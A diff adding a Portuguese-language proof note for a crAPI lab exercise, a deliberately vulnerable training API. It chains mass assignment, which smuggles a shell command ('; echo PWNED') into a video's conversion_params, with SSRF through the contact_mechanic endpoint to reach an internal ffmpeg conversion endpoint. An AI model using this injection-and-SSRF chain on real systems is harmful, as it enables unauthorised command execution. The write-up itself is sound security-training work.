@@ -1,0 +1,22 @@
+# Shell Injection (encadeando Mass Assignment + SSRF)
+# video_id do atacante: 52
+----------------------------------------------------------------
+# 1) Mass Assignment em conversion_params (propriedade interna):
+#    PUT /identity/api/v2/user/videos/52  -> HTTP 200
+#    {"id":52,"video_name":null,"conversion_params":"-i /dev/null; echo PWNED","profileVideo":"data:image/jpeg;base64,RkFLRVZJREVPMTIzNDU="}
+# 2) convert_video pelo gateway público é bloqueado:
+#    -> HTTP 403  {"message":"Thi-S endpoint S-hould be accessed only inte-Rnally. -Fine? , endpoint_url http://crapi-identity:8080/identity/api/v2/user/videos/convert_video","st
+# 3) SSRF (contact_mechanic) -> convert_video INTERNO:
+#    mechanic_api = http://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id=52
+#    -> HTTP 200
+#    resposta (base64 decodificada):
+#      WOW. Look at you. Combining Mass Assignment and SSRF to exploit a hidden Shell Injection.
+#      We're very proud. You won the game. Unfortunately, we don't actually  
+#      allow our pentester to run arbitrary shell commands on our backend :( 
+#      It could be very expensive and annoying to maintain it. 
+#      Anyhow, if you host your own instance of crAPI, you can simply change the
+#      `block_shell_injections` flag in the config file to allow real shell injections.
+----------------------------------------------------------------
+# Prova: o chain Mass Assignment + SSRF alcança o sink de shell injection
+# (convert_video, que executa ffmpeg com conversion_params). A execução real
+# de comandos fica atrás do flag de config 'block_shell_injections' (ligado por padrão).
